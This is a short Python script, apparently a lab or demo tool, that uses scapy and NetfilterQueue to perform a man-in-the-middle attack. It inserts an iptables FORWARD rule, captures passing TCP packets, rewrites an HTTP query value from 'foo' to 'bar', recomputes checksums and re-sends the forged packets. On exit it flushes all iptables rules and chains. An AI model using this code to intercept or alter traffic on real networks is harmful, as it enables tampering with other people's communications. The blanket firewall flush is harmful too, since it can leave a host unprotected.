from scapy.all import *
from netfilterqueue import NetfilterQueue


# Add IP Table rules for nfqueue

# check packets coming in
# sudo iptables -A INPUT -p tcp -j NFQUEUE --queue-num 1

# check packets going out
# iptablesr = "iptables -A OUTPUT -p tcp -j NFQUEUE --queue-num 1"

# If you want to use it for MITM :
iptablesr = "iptables -A FORWARD -j NFQUEUE --queue-num 1" 
# os.system("sysctl net.ipv4.ip_forward=1")


print("Adding iptable rules :")
print(iptablesr)
os.system(iptablesr)


def modify(packet):
    try:
        pkt = IP(packet.get_payload())
        print(pkt.show())
        # check if the current packet is the correct packet
        if '/display_text?input=foo' in str(pkt[TCP].payload):
            print(pkt.show())
            # print("***********************************")

            #altering packet payload
            payload_before = len(pkt[TCP].payload)
            old_bytes = bytes('/display_text?input=foo','utf-8')
            new_bytes = bytes('/display_text?input=bar','utf-8')

            old_payload = bytes(pkt[TCP].payload)
            new_payload = old_payload.replace(old_bytes,new_bytes)

            pkt[TCP].remove_payload()
            pkt[TCP].add_payload(new_payload)


            #recalculating checksum
            payload_after = len(pkt[TCP].payload)
            payload_diff =  payload_after - payload_before
            pkt[IP].len = pkt[IP].len + payload_diff
            del pkt[IP].chksum
            del pkt[TCP].chksum
            del pkt.chksum

            # sending new scapy packet
            print(pkt.show())
            send(pkt)
        else:
            # if not the target packet accept nfqueue packet
            packet.accept()
    except Exception as e:
        print("Exception: " + str(e))
        # print(packet)
    

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)
try:
    print("Waiting")
    nfqueue.run()
except KeyboardInterrupt:
    print("Flushing iptables.")
    # This flushes everything, you might wanna be careful
    os.system('iptables -F')
    os.system('iptables -X')